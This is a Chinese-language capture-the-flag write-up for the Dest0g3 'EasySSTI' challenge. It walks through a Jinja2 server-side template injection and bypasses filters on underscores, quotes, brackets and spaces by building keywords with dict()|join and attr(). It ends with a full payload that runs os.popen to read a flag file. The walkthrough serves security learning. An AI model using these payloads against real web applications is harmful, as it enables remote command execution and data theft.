---
title: '[Dest0g3 520迎新赛]EasySSTI'
date: 2025-02-02 21:14:38
tags: ssti
categories: 刷题笔记
---

## [Dest0g3 520迎新赛]EasySSTI

![image-20250202211511974](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022115054.png)

我们通过测试，那先username可以进行ssti注入

`用''.__class__等进行简单测试，发现_，'，"，，[都被过滤了，于是用{{().request.args.class}}&class=__class__尝试绕过，结果request也被过滤`

我们学习feng师傅的[文章](https://blog.csdn.net/rfrder/article/details/115272645?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165313511116780366513158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165313511116780366513158&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2)进行拼接

```
{{config}}可以用来查看配置信息，通过这个或许能够构造出我们需要的payload
```

```
1. python下的数据拼接
join 方法 拼接字典，主要用于索引上的合并:默认按索引合并，可以合并相同或相似的索引，不管他们有没有重叠列

2. {{()|select|string|list}}  or  {{lipsum|select|string|list}}     
获取字符列表  

3. {{lipsum.__globals__['os'].popen('ls').read()}}
命令执行
```

所以我们可以用来构造被过滤的关键字

```
#构造po="pop"     #利用dict()|join拼接得到
{% set po=dict(po=a,p=a)|join%}
 
#构造a=(()|select|string|list).pop(24),这里a即下划线_
{% set a=(()|select|string|list)|attr(po)(24)%}
 
#构造ini="__init__"
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
 
#构造glo="__globals__"
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
 
#构造geti="__getitem__"
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
 
#构造built="__builtins__"
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
 
#构造sub="__subclasses__"
{% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%}

#构造chr()函数调用
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}

#构造file='/flag'
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}

```

回到该题，由于空格被过滤，我们使用%0a代替

```
{%set%0apo=dict(po=a,p=a)|join()%}                        #pop
{%set%0aa=(()|select|string|list)|attr(po)(24)%}          #_
{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}  #globals
{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%} #getitem
{%set%0ape=dict(po=aaa,pen=aaa)|join()%}                  #popen
{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}               #read
dict(o=a,s=a)|join()                #获取 os
(config|string|list)|attr(po)(279)  #获取  /


{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}
<==>
{{lipsum.__globals__['os'].popen('ls').read()}}

```

最终payload

```
{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()}}
```

![image-20250202214529854](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022145902.png)





参考

https://blog.csdn.net/rfrder/article/details/115272645?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165313511116780366513158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165313511116780366513158&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2

https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/
